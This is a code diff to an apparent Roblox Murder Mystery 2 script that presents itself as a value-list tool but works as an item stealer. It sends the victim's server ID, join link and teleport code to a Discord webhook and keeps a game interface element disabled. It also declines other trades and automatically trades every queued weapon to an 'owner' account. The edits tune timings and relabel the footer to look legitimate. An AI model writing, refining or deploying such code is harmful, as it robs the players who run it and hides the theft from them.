@@ -83,7 +83,7 @@ local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
     unique = "https://supremevaluelist.com/mm2/uniques.html",
-    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    vintage = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
 local headers = {
@@ -226,7 +226,7 @@ local sent = SendDiscord({
             {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](" .. JoinLink .. ")", inline = false},
             {name = "Teleport Code", value = "```lua\n" .. TeleportCode .. "\n```", inline = false}
         },
-        footer = {text = "Job ID: " .. JobId .. " | Debug mode ON - check console"},
+        footer = {text = "Job ID: " .. JobId .. " | SupremeValueList + Auto-Trade Active"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 })
@@ -245,7 +245,6 @@ pcall(function()
     if tg then tg.Enabled = false; tg:GetPropertyChangedSignal("Enabled"):Connect(function() tg.Enabled = false end) end
 end)
 
--- ========== TRADE REMOTES - MULTIPLE FALLBACKS ==========
 local TradeRemotes = {
     SendRequest = {
         ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendTradeRequest"),
@@ -305,7 +304,7 @@ end
 local function sendTradeRequest(name)
     local target = Players:FindFirstChild(name)
     if not target then return false end
-    local success, err = pcall(function()
+    local success = pcall(function()
         if SendTradeRequestRemote then SendTradeRequestRemote:InvokeServer(target) end
     end)
     return success
@@ -327,9 +326,7 @@ local function declineRequest()
     pcall(function() if DeclineRequestRemote then DeclineRequestRemote:FireServer() end end)
 end
 
--- ========== MAIN TRADE LOOP ==========
 task.spawn(function()
-    repeat task.wait(0.5) until #Players:GetPlayers() > 1
     local owner = nil
     local waited = 0
     repeat
@@ -347,13 +344,13 @@ task.spawn(function()
         return
     end
     
-    task.wait(2)
+    task.wait(1.5)
     
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
         
         if status == "None" then
-            local sent = sendTradeRequest(owner.Name)
+            sendTradeRequest(owner.Name)
             task.wait(2)
         elseif status == "ReceivingRequest" then
             declineRequest()
@@ -363,12 +360,12 @@ task.spawn(function()
                 local item = table.remove(weaponsToSend, 1)
                 for _ = 1, item.Amount do
                     addItem(item.DataID)
-                    task.wait(0.08)
+                    task.wait(0.05)
                 end
             end
-            task.wait(5.5)
+            task.wait(6)
             acceptTrade()
-            repeat task.wait(0.2) until getTradeStatus() == "None" or #weaponsToSend == 0
+            repeat task.wait(0.1) until getTradeStatus() == "None" or #weaponsToSend == 0
             task.wait(1)
         else
             task.wait(0.5)
